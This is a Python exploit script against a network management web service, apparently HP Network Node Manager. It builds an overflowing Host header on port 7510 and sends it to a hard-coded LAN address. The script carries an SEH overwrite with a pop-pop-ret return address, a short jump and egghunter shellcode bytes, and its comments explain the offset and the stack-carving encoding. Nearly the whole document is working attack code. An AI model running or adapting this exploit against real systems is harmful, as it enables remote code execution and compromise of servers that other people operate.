#!/usr/bin/python

import socket
import os
import sys

#rubbish = "A" * 4000
# possible return addresses
#0x6D3B7D42      pop eax - pop - retbis
#0x6D396F21  pop eax - pop - ret

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#offset match at 3381
rubbish = "\x41" * 3377 +"\x4c\x4c\x77\x21" + "\x2b\x46\x35\x6d" + "\x43"* 615

# Jump over SEH Return Address
#4C      DEC ESP
#4C      DEC ESP
#77 21   JA SHORT 1035FE59

# Encoded egghunter Shellcode

#25 4A4D4E55      AND EAX,554E4D4A    Zero out EAX
#25 3532312A      AND EAX,2A313235    Zero out EAX
#54               PUSH ESP
#58               POP EAX
#2D 664D5555      SUB EAX,55554D66    Carve out last 4 bytes
#2D 664B5555      SUB EAX,55554B66    Carve out last 4 bytes
#2D 6A505555      SUB EAX,5555506A    Carve out last 4 bytes
#50               PUSH EAX            Push AFEA75AF onto the stack 
#5C               POP ESP

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + rubbish + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+="TOOWTOOW" * 1242

print "[*] Sending das evil request to NNM"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.176",7510))
s.send(buffer)
s.close()
